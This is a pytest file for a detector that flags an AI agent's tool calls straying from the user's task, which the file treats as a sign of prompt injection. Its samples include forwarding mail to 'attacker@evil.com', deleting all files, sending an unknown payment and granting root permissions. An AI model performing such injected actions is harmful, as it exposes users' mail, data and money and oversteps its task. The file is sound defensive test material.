"""
Verifies param-vs-task divergence detector (§09/§04's primary
injection signal) mechanics: on-topic calls score above threshold,
off-topic calls score below. Uses FakeSemanticEmbedder (bag-of-words),
NOT FakeTaskEmbedder — divergence needs partial-overlap structure,
which the hash-based fake cannot provide (see attribution/embedding.py
docstrings).

Real numbers behind these thresholds were inspected manually before
writing this suite (see project chat/commit log) — not guessed.
DEFAULT_DIVERGENCE_THRESHOLD is an explicit placeholder pending real
calibration against a labeled corpus (§15) with real MiniLM.
"""
import pytest

from simulacrum.attribution import FakeSemanticEmbedder, TaskRepresentation
from simulacrum.detectors import check_param_divergence
from simulacrum.task_sim import TASK_INITIAL_USER_TEXT, TaskType


@pytest.fixture
def embedder():
    return FakeSemanticEmbedder()


def _task_for(task_type: TaskType, embedder) -> TaskRepresentation:
    return TaskRepresentation.start(
        embedder=embedder, initial_user_text=TASK_INITIAL_USER_TEXT[task_type]
    )


def test_on_topic_call_not_divergent(embedder):
    task = _task_for(TaskType.FLIGHT_BOOKING, embedder)
    result = check_param_divergence(
        task_representation=task,
        tool_name="search_flights",
        params={"origin": "JFK", "destination": "LHR"},
    )
    assert result.is_divergent is False
    assert result.similarity > 0.15


def test_off_topic_call_is_divergent(embedder):
    task = _task_for(TaskType.INBOX_TRIAGE, embedder)
    result = check_param_divergence(
        task_representation=task,
        tool_name="set_forwarding_rule",
        params={"target": "attacker@evil.com"},
    )
    assert result.is_divergent is True
    assert result.similarity == pytest.approx(0.0)


@pytest.mark.parametrize(
    "task_type,tool_name,params",
    [
        (TaskType.INBOX_TRIAGE, "read_inbox", {"count": "5"}),
        (TaskType.INBOX_TRIAGE, "reply_to_email", {"email_id": "1", "body": "Acknowledged"}),
        (TaskType.FLIGHT_BOOKING, "search_flights", {"origin": "JFK", "destination": "LHR"}),
        (TaskType.FLIGHT_BOOKING, "book_flight", {"flight_id": "FL1234"}),
    ],
)
def test_all_normal_task_sim_calls_not_divergent(embedder, task_type, tool_name, params):
    """
    Every legitimate call shape task_sim actually generates must NOT
    be flagged — a false positive here would mean the detector
    disagrees with the corpus generator on what 'normal' looks like.
    """
    task = _task_for(task_type, embedder)
    result = check_param_divergence(task_representation=task, tool_name=tool_name, params=params)
    assert result.is_divergent is False, f"False positive: {tool_name}, sim={result.similarity}"


@pytest.mark.parametrize(
    "task_type,tool_name,params",
    [
        (TaskType.INBOX_TRIAGE, "delete_data", {"target": "all_files"}),
        (TaskType.FLIGHT_BOOKING, "send_payment", {"amount": "5000", "recipient": "unknown"}),
        (TaskType.FLIGHT_BOOKING, "modify_permissions", {"user": "admin", "level": "root"}),
    ],
)
def test_unrelated_high_risk_calls_are_divergent(embedder, task_type, tool_name, params):
    task = _task_for(task_type, embedder)
    result = check_param_divergence(task_representation=task, tool_name=tool_name, params=params)
    assert result.is_divergent is True, f"Missed: {tool_name}, sim={result.similarity}"


def test_custom_threshold_respected(embedder):
    """
    Threshold is a required-with-default kwarg, not hardcoded —
    calibration work later must be able to override it per-call.

    NOTE on direction: is_divergent = similarity < threshold. A HIGH
    threshold is STRICT (flags more things, since more similarities
    fall below it); threshold=0.0 is the most PERMISSIVE setting
    (only negative similarity gets flagged). Using a strict/high
    threshold here to force even an on-topic call to be flagged,
    proving the override actually takes effect.
    """
    task = _task_for(TaskType.FLIGHT_BOOKING, embedder)
    result = check_param_divergence(
        task_representation=task,
        tool_name="search_flights",  # genuinely on-topic, sim ~0.866
        params={"origin": "JFK", "destination": "LHR"},
        threshold=0.99,  # stricter than any measured on-topic similarity
    )
    assert result.is_divergent is True


def test_call_topic_text_falls_back_gracefully_for_unknown_tool():
    from simulacrum.attribution import call_topic_text
    text = call_topic_text(tool_name="totally_unknown_tool", params={"x": "y"})
    assert "totally_unknown_tool" in text
    assert "x" in text and "y" in text
